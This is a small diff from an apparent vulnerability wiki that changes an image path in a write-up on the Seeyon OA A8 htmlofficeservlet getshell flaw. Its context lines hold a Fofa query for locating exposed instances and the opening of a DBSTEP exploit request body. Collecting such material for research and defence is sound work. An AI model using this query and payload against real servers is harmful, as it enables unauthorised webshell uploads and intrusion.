@@ -26,7 +26,7 @@ alt=\"1.png\" class=\"large\" onclick=\"window.open(this.src)\" /\>
     seeyon
     Fofa：app="用友-致远OA"
 
-![0d4b978ed1474946.png](/Users/aresx/Documents/VulWiki/.resource/致远OAA8htmlofficeservletgetshell漏洞/media/rId25.png)
+![0d4b978ed1474946.png](./.resource/致远OAA8htmlofficeservletgetshell漏洞/media/rId25.png)
 
     DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
     OPTION=S3WYOSWLBSGr
